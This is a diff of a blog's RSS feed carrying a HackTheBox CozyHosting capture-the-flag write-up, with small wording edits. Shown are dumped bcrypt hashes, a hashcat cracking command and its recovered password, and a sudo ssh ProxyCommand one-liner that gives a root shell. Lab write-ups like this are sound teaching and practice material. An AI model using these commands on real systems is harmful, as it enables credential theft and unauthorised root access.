@@ -17,7 +17,7 @@
       <guid>http://localhost:1313/posts/cozyhosting/</guid>
       <description><![CDATA[<p><img src="/img/cozyhosting/cozyhosting.png" alt="CozyHosting"></p>
 <h3 id="description">Description</h3>
-<p>CozyHosting is an easy-rated challenge on HackTheBox. The foothold involves finding exposed user sessions, exploitating an authenticated
+<p>CozyHosting is an easy-rated challenge on HackTheBox. The foothold involves finding an exposed user session and exploitating an authenticated
 command injection vulnerability. After gaining a shell, we find hardcoded user credentials and exploit sudo permissions to escalate to root.</p>
 <h3 id="recon">Recon</h3>
 <p>Starting off with a nmap scan, we find 2 open TCP ports: 22 and 80.</p>
@@ -222,7 +222,7 @@ cozyhosting=# select * from users;
 cozyhosting=# 
 </code></pre><pre tabindex="0"><code> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
  admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
-</code></pre><p>I was only able to crack the password hash for <code>admin</code>. We can test for password reuse.</p>
+</code></pre><p>I was only able to crack the password hash for <code>admin</code>, which doesn&rsquo;t provide much for directly, but we can test for password reuse.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
 └─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -m 3200 --show
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
@@ -252,7 +252,8 @@ in order to see our commands and responses within our current session. Payload c
 <pre tabindex="0"><code>josh@cozyhosting:/tmp$ sudo ssh -o ProxyCommand=&#39;;bash 0&lt;&amp;2 1&gt;&amp;2&#39; x
 root@cozyhosting:/tmp# whoami
 root
-</code></pre>]]></description>
+</code></pre><p>And with that, CozyHosting is owned.</p>
+]]></description>
       
     </item>
     
